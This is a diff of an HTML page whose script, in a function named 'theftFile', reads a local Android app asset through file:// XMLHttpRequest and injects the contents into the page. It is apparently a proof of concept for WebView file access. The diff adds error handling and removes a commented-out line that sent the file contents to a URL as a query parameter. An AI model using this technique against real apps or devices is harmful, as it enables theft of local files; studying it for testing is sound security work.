@@ -2,27 +2,30 @@
 <head>
 <script type="text/javascript">
     function theftFile(path, callback) {
-      var req = new XMLHttpRequest();
+        var req = new XMLHttpRequest();
 
-      req.open("GET", "file://" + path, true);
-      req.onload = function(e) {
-        callback(req.responseText);
-      }
-      req.onerror = function(e) {
-        callback(null);
-      }
-      req.send();
+        req.open("GET", "file://" + path, true);
+        req.onload = function (e) {
+            callback(req.responseText, null); // Send response and null for error
+        };
+        req.onerror = function (e) {
+            callback(null, "Error: Unable to load file " + path); // Send error message
+        };
+        req.send();
     }
 
     var file = "/android_asset/ads/house_ad_icon_144x144.webp";
 
-    theftFile(file, function(contents) {
-      document.getElementById("add_to_me")
-                .innerHTML +=
-                `<h3>` +
-                contents +
-                `</h3>`;
-        //location.href = "https://localhost/?data=" + encodeURIComponent(contents);
+    theftFile(file, function (contents, error) {
+        var targetDiv = document.getElementById("add_to_me");
+        
+        if (contents) {
+            targetDiv.innerHTML += `<h3>${contents}</h3>`;
+        }
+
+        if (error) {
+            targetDiv.innerHTML += `<p style="color: red; font-weight: bold;">${error}</p>`;
+        }
     });
 </script>
 </head>
